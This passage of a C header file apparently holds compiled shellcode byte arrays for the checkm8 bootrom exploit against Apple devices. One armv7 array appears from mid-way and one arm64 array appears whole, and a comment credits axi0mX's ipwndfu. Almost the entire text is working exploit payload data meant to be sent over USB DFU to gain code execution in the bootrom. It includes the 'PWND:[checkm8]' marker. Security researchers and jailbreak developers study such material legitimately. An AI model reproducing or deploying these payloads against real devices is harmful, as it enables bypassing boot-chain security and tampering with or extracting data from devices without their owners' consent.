    0x03, 0xe0, 0x78, 0x68, 0xff, 0xf7, 0xa0, 0xff, 0x03, 0x46, 0x18, 0x46,
    0x10, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0,
    0x00, 0xaf, 0x78, 0x60, 0x78, 0x68, 0xff, 0xf7, 0xf5, 0xfe, 0xf8, 0x60,
    0x78, 0x68, 0xff, 0xf7, 0xd9, 0xff, 0xb8, 0x60, 0xbb, 0x68, 0x00, 0x2b,
    0x01, 0xd1, 0x00, 0x23, 0x06, 0xe0, 0xba, 0x68, 0x4f, 0xf4, 0x00, 0x53,
    0xc6, 0xf2, 0x18, 0x03, 0x13, 0x60, 0x01, 0x23, 0x18, 0x46, 0x10, 0x37,
    0xbd, 0x46, 0x80, 0xbd, 0x80, 0xb4, 0x87, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x00, 0x23, 0x7b, 0x61, 0x00, 0x23, 0x3b, 0x61, 0x7b, 0x68, 0x1b, 0x78,
    0x2d, 0x2b, 0x04, 0xd1, 0x01, 0x23, 0x3b, 0x61, 0x7b, 0x68, 0x01, 0x33,
    0x7b, 0x60, 0x7b, 0x68, 0x5a, 0x1c, 0x7a, 0x60, 0x1b, 0x78, 0xfb, 0x60,
    0xfb, 0x68, 0x2f, 0x2b, 0x0c, 0xdd, 0xfb, 0x68, 0x39, 0x2b, 0x09, 0xdc,
    0x7b, 0x69, 0xda, 0x00, 0x7b, 0x69, 0x5b, 0x00, 0x1a, 0x44, 0xfb, 0x68,
    0x30, 0x3b, 0x13, 0x44, 0x7b, 0x61, 0xea, 0xe7, 0x3b, 0x69, 0x00, 0x2b,
    0x02, 0xd0, 0x7b, 0x69, 0x5b, 0x42, 0x00, 0xe0, 0x7b, 0x69, 0x18, 0x46,
    0x1c, 0x37, 0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b, 0x70, 0x47, 0x00, 0xbf,
    0x80, 0xb4, 0x87, 0xb0, 0x00, 0xaf, 0xf8, 0x60, 0xb9, 0x60, 0x7a, 0x60,
    0xbb, 0x68, 0xda, 0xb2, 0x13, 0x46, 0x1b, 0x02, 0x13, 0x44, 0x1a, 0x04,
    0x13, 0x44, 0x3b, 0x61, 0xfb, 0x68, 0x7b, 0x61, 0x7b, 0x68, 0x1f, 0x2b,
    0x0c, 0xd8, 0x05, 0xe0, 0x7b, 0x69, 0x5a, 0x1c, 0x7a, 0x61, 0xba, 0x68,
    0xd2, 0xb2, 0x1a, 0x70, 0x7b, 0x68, 0x5a, 0x1e, 0x7a, 0x60, 0x00, 0x2b,
    0xf4, 0xd1, 0x27, 0xe0, 0x08, 0xe0, 0x7b, 0x68, 0x01, 0x3b, 0x7b, 0x60,
    0x7b, 0x69, 0x5a, 0x1c, 0x7a, 0x61, 0xba, 0x68, 0xd2, 0xb2, 0x1a, 0x70,
    0x7b, 0x69, 0x03, 0xf0, 0x03, 0x03, 0x00, 0x2b, 0xf1, 0xd1, 0x08, 0xe0,
    0x7b, 0x68, 0x04, 0x3b, 0x7b, 0x60, 0x7b, 0x69, 0x3a, 0x69, 0x1a, 0x60,
    0x7b, 0x69, 0x04, 0x33, 0x7b, 0x61, 0x7b, 0x68, 0x03, 0x2b, 0xf3, 0xd8,
    0x05, 0xe0, 0x7b, 0x69, 0x5a, 0x1c, 0x7a, 0x61, 0xba, 0x68, 0xd2, 0xb2,
    0x1a, 0x70, 0x7b, 0x68, 0x5a, 0x1e, 0x7a, 0x60, 0x00, 0x2b, 0xf4, 0xd1,
    0xfb, 0x68, 0x18, 0x46, 0x1c, 0x37, 0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b,
    0x70, 0x47, 0x00, 0xbf, 0x80, 0xb5, 0x88, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x39, 0x60, 0x07, 0xf1, 0x08, 0x03, 0x18, 0x46, 0x00, 0x21, 0x0c, 0x22,
    0xff, 0xf7, 0xa4, 0xff, 0x3b, 0x68, 0xfb, 0x60, 0x7b, 0x68, 0xbb, 0x60,
    0xbb, 0x68, 0x1b, 0x68, 0xfb, 0x61, 0xfa, 0x69, 0x46, 0xf2, 0x33, 0x73,
    0xc4, 0xf6, 0x6d, 0x13, 0x9a, 0x42, 0x02, 0xd1, 0x4f, 0xf0, 0xff, 0x33,
    0x24, 0xe0, 0xfa, 0x69, 0x0e, 0x23, 0xce, 0xf6, 0x00, 0x23, 0x9a, 0x42,
    0x02, 0xd0, 0x4f, 0xf0, 0xff, 0x33, 0x1b, 0xe0, 0xbb, 0x68, 0x03, 0xf2,
    0x86, 0x23, 0xbb, 0x61, 0xb8, 0x69, 0xff, 0xf7, 0x4f, 0xff, 0x03, 0x46,
    0x3b, 0x61, 0x3b, 0x69, 0x00, 0x2b, 0x02, 0xd1, 0x4f, 0xf0, 0xff, 0x33,
    0x0c, 0xe0, 0x07, 0xf1, 0x08, 0x03, 0x18, 0x46, 0xff, 0xf7, 0x26, 0xff,
    0x78, 0x61, 0x7b, 0x69, 0x00, 0x2b, 0x02, 0xd1, 0x4f, 0xf0, 0xff, 0x33,
    0x00, 0xe0, 0x00, 0x23, 0x18, 0x46, 0x20, 0x37, 0xbd, 0x46, 0x80, 0xbd
};
unsigned int checkm8_payload_length_armv7_with_img3_p = 3120;


// Based on ipwndfu payload by axi0mX
// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/checkm8_arm64.S
// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/usb_0xA1_2_arm64.S

const unsigned char checkm8_payload_arm64[] = {
    0x13, 0x00, 0x80, 0xd2, 0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91,
    0xa0, 0x0b, 0x00, 0x58, 0x00, 0x04, 0x40, 0xa9, 0xc2, 0x09, 0x00, 0x10,
    0x43, 0x10, 0x40, 0xa9, 0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x00, 0xa9,
    0x43, 0x10, 0x41, 0xa9, 0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x01, 0xa9,
    0xc0, 0x0a, 0x00, 0x58, 0x00, 0x04, 0x00, 0x91, 0x01, 0x00, 0x40, 0x39,
    0xc1, 0xff, 0xff, 0x35, 0x61, 0x09, 0x00, 0x10, 0x22, 0x0c, 0x40, 0xa9,
    0x02, 0x0c, 0x00, 0xa9, 0xe0, 0x09, 0x00, 0x58, 0x01, 0x0a, 0x00, 0x58,
    0x20, 0x00, 0x3f, 0xd6, 0x01, 0x0a, 0x00, 0x58, 0x20, 0x00, 0x00, 0x39,
    0x00, 0x0a, 0x00, 0x58, 0xe1, 0xfc, 0xff, 0x10, 0x02, 0x0a, 0x00, 0x58,
    0x21, 0x00, 0x02, 0x8b, 0x02, 0x00, 0x80, 0xd2, 0xe3, 0x09, 0x00, 0x58,
    0x04, 0x0a, 0x00, 0x58, 0x05, 0x60, 0x00, 0x91, 0x85, 0x00, 0x00, 0xf9,
    0x23, 0x10, 0x40, 0xa9, 0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x41, 0xa9,
    0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x42, 0xa9, 0x03, 0x10, 0x02, 0xa9,
    0x23, 0x10, 0x43, 0xa9, 0x03, 0x10, 0x03, 0xa9, 0x20, 0x7e, 0x0b, 0xd5,
    0xbf, 0x3f, 0x03, 0xd5, 0x00, 0x00, 0x01, 0x91, 0x21, 0x00, 0x01, 0x91,
    0x42, 0x00, 0x01, 0x91, 0x5f, 0x00, 0x03, 0xeb, 0x43, 0xfe, 0xff, 0x54,
    0x00, 0x08, 0x00, 0x58, 0x21, 0x08, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x20, 0x08, 0x00, 0x58, 0x41, 0x08, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x01, 0x08, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x01, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x61, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x21, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0xe1, 0x05, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x81, 0x05, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0x21, 0x05, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x00, 0x10, 0x00, 0x91, 0xc1, 0x04, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9,
    0x1f, 0x75, 0x08, 0xd5, 0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
    0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6, 0x09, 0x02, 0x19, 0x00,
    0x01, 0x01, 0x05, 0x80, 0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01,
    0x00, 0x00, 0x07, 0x21, 0x01, 0x0a, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x50, 0x57, 0x4e, 0x44, 0x3a, 0x5b, 0x63,
    0x68, 0x65, 0x63, 0x6b, 0x6d, 0x38, 0x5d, 0x00, 0x1f, 0x20, 0x03, 0xd5,
    0x01, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x04, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x07, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x0a, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x0d, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x6b, 0x69,
    0x6e, 0x2d, 0x69, 0x72, 0x6f, 0x20, 0x6d, 0x6f, 0x73, 0x61, 0x69, 0x63,
    0x20, 0x00, 0x20, 0xd4, 0x02, 0x00, 0x40, 0x79, 0x5f, 0x84, 0x0a, 0x71,
    0x81, 0xff, 0xff, 0x54, 0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91,
    0xf4, 0x4f, 0xbf, 0xa9, 0xf3, 0x03, 0x00, 0xaa, 0xf4, 0x0d, 0x00, 0x58,
    0xe1, 0xff, 0x9f, 0x52, 0x62, 0x06, 0x40, 0x79, 0x3f, 0x00, 0x02, 0x6b,
    0xe1, 0x04, 0x00, 0x54, 0x80, 0x02, 0x40, 0xf9, 0x61, 0x0d, 0x00, 0x58,
    0x1f, 0x00, 0x01, 0xeb, 0xe1, 0x01, 0x00, 0x54, 0x9f, 0x02, 0x00, 0xf9,
    0x80, 0x0a, 0x40, 0xf9, 0x81, 0x0e, 0x40, 0xf9, 0x82, 0x12, 0x40, 0xf9,
    0x83, 0x16, 0x40, 0xf9, 0x84, 0x1a, 0x40, 0xf9, 0x85, 0x1e, 0x40, 0xf9,
    0x86, 0x22, 0x40, 0xf9, 0x87, 0x22, 0x40, 0xf9, 0x88, 0x06, 0x40, 0xf9,
    0x00, 0x01, 0x3f, 0xd6, 0xe8, 0x0b, 0x00, 0x58, 0x88, 0x02, 0x00, 0xa9,
    0x15, 0x00, 0x00, 0x14, 0xc1, 0x0b, 0x00, 0x58, 0x1f, 0x00, 0x01, 0xeb,
    0x01, 0x01, 0x00, 0x54, 0x9f, 0x02, 0x00, 0xf9, 0x80, 0x06, 0x41, 0xa9,
    0x82, 0x12, 0x40, 0xf9, 0x32, 0x00, 0x00, 0x94, 0xa8, 0x0a, 0x00, 0x58,
    0x88, 0x02, 0x00, 0xf9, 0x0b, 0x00, 0x00, 0x14, 0xc1, 0x0a, 0x00, 0x58,
    0x1f, 0x00, 0x01, 0xeb, 0x01, 0x01, 0x00, 0x54, 0x9f, 0x02, 0x00, 0xf9,
    0x80, 0x06, 0x41, 0xa9, 0x82, 0x12, 0x40, 0xf9, 0x0e, 0x00, 0x00, 0x94,
    0x68, 0x09, 0x00, 0x58, 0x88, 0x02, 0x00, 0xf9, 0x01, 0x00, 0x00, 0x14,
    0x00, 0x10, 0x80, 0x52, 0xe1, 0x03, 0x14, 0xaa, 0x62, 0x0e, 0x40, 0x79,
    0x03, 0x00, 0x80, 0xd2, 0x44, 0x09, 0x00, 0x58, 0x80, 0x00, 0x3f, 0xd6,
    0x00, 0x00, 0x80, 0x52, 0xf4, 0x4f, 0xc1, 0xa8, 0xfd, 0x7b, 0xc1, 0xa8,
    0xc0, 0x03, 0x5f, 0xd6, 0xe3, 0xc3, 0x00, 0xb2, 0x21, 0x1c, 0x40, 0x92,
    0x21, 0x7c, 0x03, 0x9b, 0xe3, 0x03, 0x00, 0xaa, 0x5f, 0x20, 0x00, 0xf1,
    0xa3, 0x00, 0x00, 0x54, 0x01, 0x00, 0x00, 0xf9, 0x00, 0x20, 0x00, 0x91,
    0x42, 0x20, 0x00, 0xd1, 0xfb, 0xff, 0xff, 0x17, 0x5f, 0x10, 0x00, 0xf1,
    0x83, 0x00, 0x00, 0x54, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x42, 0x10, 0x00, 0xd1, 0x5f, 0x08, 0x00, 0xf1, 0x83, 0x00, 0x00, 0x54,
    0x01, 0x00, 0x00, 0xb9, 0x00, 0x08, 0x00, 0x91, 0x42, 0x08, 0x00, 0xd1,
    0x82, 0x00, 0x00, 0xb4, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x04, 0x00, 0x91,
    0x42, 0x04, 0x00, 0xd1, 0xe0, 0x03, 0x03, 0xaa, 0xc0, 0x03, 0x5f, 0xd6,
    0xe4, 0x03, 0x00, 0xaa, 0x5f, 0x20, 0x00, 0xf1, 0xe3, 0x00, 0x00, 0x54,
    0x23, 0x00, 0x40, 0xf9, 0x03, 0x00, 0x00, 0xf9, 0x00, 0x20, 0x00, 0x91,
    0x21, 0x20, 0x00, 0x91, 0x42, 0x20, 0x00, 0xd1, 0xf9, 0xff, 0xff, 0x17,
    0x5f, 0x10, 0x00, 0xf1, 0xc3, 0x00, 0x00, 0x54, 0x23, 0x00, 0x40, 0xb9,
    0x03, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91, 0x21, 0x10, 0x00, 0x91,
    0x42, 0x10, 0x00, 0xd1, 0x5f, 0x08, 0x00, 0xf1, 0xc3, 0x00, 0x00, 0x54,
    0x23, 0x00, 0x40, 0x79, 0x03, 0x00, 0x00, 0x79, 0x00, 0x08, 0x00, 0x91,
    0x21, 0x08, 0x00, 0x91, 0x42, 0x08, 0x00, 0xd1, 0xc2, 0x00, 0x00, 0xb4,
    0x23, 0x00, 0x40, 0x39, 0x03, 0x00, 0x00, 0x39, 0x00, 0x04, 0x00, 0x91,
    0x21, 0x04, 0x00, 0x91, 0x42, 0x04, 0x00, 0xd1, 0xe0, 0x03, 0x04, 0xaa,
    0xc0, 0x03, 0x5f, 0xd6, 0x1f, 0x20, 0x03, 0xd5, 0x01, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
    0x06, 0x00, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00
};
unsigned int checkm8_payload_length_arm64 = 1088;

#endif